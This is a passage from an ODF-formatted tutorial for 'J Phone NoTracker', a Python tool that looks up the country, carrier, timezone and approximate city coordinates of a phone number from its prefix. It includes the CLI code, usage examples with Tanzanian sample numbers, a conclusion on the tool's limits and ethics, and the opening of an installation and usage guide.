      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>phone_number: Phone number to track</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>client_id: Client identifier for rate limiting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>Dictionary with results and metadata</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Rate limiting check</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>if not self.check_rate_limit(client_id):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'success': False,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'error': 'Rate limit exceeded',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'rate_limit_remaining': 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Sanitize input</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>clean_number = sanitize_phone_number(phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Basic validation</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not validate_phone_number(clean_number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.logger.warning(f"Invalid phone number format: {phone_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'success': False,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'error': 'Invalid phone number format'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Perform tracking</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>start_time = datetime.now()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result = self.tracker.track(clean_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>duration = (datetime.now() - start_time).total_seconds()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Prepare response</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>response = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'success': result.valid,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'data': result.to_dict() if result.valid else None,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'metadata': {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>'tracking_time_ms': duration * 1000,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>'offline_mode': self.offline_mode,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>'timestamp': datetime.now().isoformat()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Log success</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.logger.info(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>f"Tracked {clean_number[:5]}*** for {client_id} "</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>f"({duration*1000:.1f}ms)"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Add rate limit info</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>response['rate_limit_remaining'] = self.rate_limit - len(self.request_log[client_id])</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return response</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>self.logger.error(f"Error tracking {clean_number}: {e}", exc_info=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'success': False,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'error': 'Internal server error',</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'error_code': 'TRACKING_FAILED'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def batch_track(self, numbers: list, client_id: str = "unknown") -&gt; Dict[str, Any]:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Track multiple phone numbers.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>numbers: List of phone numbers</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>client_id: Client identifier</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>Dictionary with batch results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>results = []</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>successes = 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for number in numbers:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result = self.track_phone(number, client_id)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>results.append({</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'number': number,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>'result': result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>})</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if result.get('success'):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>successes += 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'batch_id': hashlib.md5(f"{client_id}{datetime.now()}".encode()).hexdigest()[:8],</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'total': len(numbers),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'successful': successes,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'failed': len(numbers) - successes,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'results': results,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'timestamp': datetime.now().isoformat()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def get_stats(self) -&gt; Dict[str, Any]:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Get tracker statistics."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'cache_size': len(self.tracker.geocode_cache),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'offline_mode': self.offline_mode,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'total_requests_today': sum(len(reqs) for reqs in self.request_log.values()),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'unique_clients': len(self.request_log),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>'supported_countries': len(CITY_CENTERS)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def main():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Main entry point with command-line interface."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser = argparse.ArgumentParser(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>description="Secure Phone Number Tracker"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"phone_number",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>nargs="?",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Phone number to track"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--offline",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Use offline mode only"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--api-key",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>help="API key for authentication"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--client-id",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>default="cli_user",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Client identifier for rate limiting"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--batch",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="JSON file containing list of numbers to batch process"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--stats",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Show tracker statistics"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"--verbose",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"-v",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>help="Verbose output"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>args = parser.parse_args()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Initialize tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>tracker = SecurePhoneTracker(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>api_key=args.api_key,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>offline_mode=args.offline</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Show stats if requested</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if args.stats:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>stats = tracker.get_stats()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("\n📊 Tracker Statistics")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("=" * 40)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>for key, value in stats.items():</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"{key.replace('_', ' ').title()}: {value}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Batch processing</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if args.batch:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>with open(args.batch, 'r') as f:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>numbers = json.load(f)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"\n📋 Processing {len(numbers)} numbers...")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>results = tracker.batch_track(numbers, args.client_id)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"\n✅ Batch Complete")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Successful: {results['successful']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Failed: {results['failed']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Batch ID: {results['batch_id']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Save results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>output_file = f"batch_results_{results['batch_id']}.json"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>with open(output_file, 'w') as f:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>json.dump(results, f, indent=2)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Results saved to: {output_file}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"❌ Batch processing failed: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Single number tracking</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not args.phone_number:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>parser.print_help()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Track the number</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>result = tracker.track_phone(args.phone_number, args.client_id)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Display results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if result['success']:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>data = result['data']</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("\n✅ TRACKING SUCCESSFUL")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("=" * 50)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"📱 Number: {data['raw_number']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"🌍 Country: {data['country_name']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if data.get('location') and data['location'] != data['country_name']:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"📍 Location: {data['location']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"📡 Carrier: {data.get('carrier_name', 'Unknown')}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"⏰ Timezone: {data['timezones'][0] if data.get('timezones') else 'Unknown'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if data.get('local_time'):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"🕐 Local Time: {data['local_time']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if data.get('latitude') and data.get('longitude'):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"🗺️ Coordinates: {data['latitude']:.6f}, {data['longitude']:.6f}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"📊 Number Type: {data.get('number_type', 'Unknown')}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Metadata</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("\n📈 Metadata")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("-" * 30)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"Tracking time: {result['metadata']['tracking_time_ms']:.1f} ms")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"Mode: {'Offline' if result['metadata']['offline_mode'] else 'Online'}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"Rate limit remaining: {result['rate_limit_remaining']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"\n❌ TRACKING FAILED")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print("=" * 30)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>print(f"Error: {result.get('error', 'Unknown error')}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if result.get('error_code'):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>print(f"Code: {result['error_code']}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">if __name__ == "__main__":</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>sys.exit(main())</text:p>
      <text:p text:style-name="Preformatted_20_Text">Usage Examples</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Track a single number</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Track with verbose output</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>python complete_example.py +255712345678 --verbose</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Use offline mode only</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255712345678 --offline</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Batch process numbers from file</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py --batch numbers.json</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Show statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py --stats</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># With API key authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255712345678 --api-key "your_secret_key"</text:p>
      <text:p text:style-name="Preformatted_20_Text">Example numbers.json for batch processing:</text:p>
      <text:p text:style-name="Preformatted_20_Text">[</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255712345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255752345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255222345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255242345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255712345679",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255712345680"</text:p>
      <text:p text:style-name="Preformatted_20_Text">]</text:p>
      <text:p text:style-name="Preformatted_20_Text">Conclusion</text:p>
      <text:p text:style-name="Preformatted_20_Text">The J Phone NoTracker project demonstrates the power and limitations of prefix-based phone number geolocation. While it can provide valuable information for legitimate purposes like fraud detection, emergency services routing, and regulatory compliance, it's crucial to understand its limitations:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Accuracy is city-level at best—it cannot pinpoint exact locations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Number portability means carrier information may be outdated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Mobile numbers only give country-level location, not city-level</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Ethical and legal considerations are paramount—this technology can easily be misused</text:p>
      <text:p text:style-name="Preformatted_20_Text">The complete implementation provided here follows production best practices with:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Proper error handling and logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Rate limiting and authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Caching for performance</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Comprehensive testing</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Security hardening</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Clear documentation of limitations</text:p>
      <text:p text:style-name="Preformatted_20_Text">Remember: With great power comes great responsibility. Always use such tools ethically and in compliance with applicable laws.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">How to Use J Phone NoTracker: A Complete Practical Guide</text:p>
      <text:p text:style-name="Preformatted_20_Text">This guide will walk you through installing and using the J Phone NoTracker phone number intelligence tool. We'll cover everything from basic single-number lookups to batch processing and GUI usage, with real examples for Tanzanian numbers.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">1. Installation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Clone the Repository</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/yourusername/j-phone-notracker.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd j-phone-notracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Set Up a Virtual Environment (Recommended)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 -m venv venv</text:p>
      <text:p text:style-name="Preformatted_20_Text">source venv/bin/activate <text:s text:c="5"/># On Linux/Mac</text:p>
      <text:p text:style-name="Preformatted_20_Text"># or</text:p>
      <text:p text:style-name="Preformatted_20_Text">venv\Scripts\activate <text:s text:c="8"/># On Windows</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Install Dependencies</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 4: Create Necessary Directories</text:p>
      <text:p text:style-name="Preformatted_20_Text">mkdir -p logs data/history</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">2. Basic Usage: Single Number Lookup</text:p>
      <text:p text:style-name="Preformatted_20_Text">The main entry point is complete_example.py. To track a single phone number, run:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">Example Output:</text:p>
      <text:p text:style-name="Preformatted_20_Text">✅ TRACKING SUCCESSFUL</text:p>
      <text:p text:style-name="Preformatted_20_Text">==================================================</text:p>
      <text:p text:style-name="Preformatted_20_Text">📱 Number: +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">🌍 Country: Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text">📍 Location: Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text">📡 Carrier: tiGO</text:p>
      <text:p text:style-name="Preformatted_20_Text">⏰ Timezone: Africa/Dar_es_Salaam</text:p>
      <text:p text:style-name="Preformatted_20_Text">🕐 Local Time: 2025-03-09 14:30:45</text:p>
      <text:p text:style-name="Preformatted_20_Text">🗺️ Coordinates: -6.792354, 39.208328</text:p>
      <text:p text:style-name="Preformatted_20_Text">📊 Number Type: Mobile</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">📈 Metadata</text:p>
      <text:p text:style-name="Preformatted_20_Text">------------------------------</text:p>
      <text:p text:style-name="Preformatted_20_Text">Tracking time: 234.5 ms</text:p>
      <text:p text:style-name="Preformatted_20_Text">Mode: Online</text:p>
      <text:p text:style-name="Preformatted_20_Text">Rate limit remaining: 99</text:p>
      <text:p text:style-name="Preformatted_20_Text">Understanding the Output</text:p>
      <text:p text:style-name="Preformatted_20_Text">Field<text:tab/>Description</text:p>
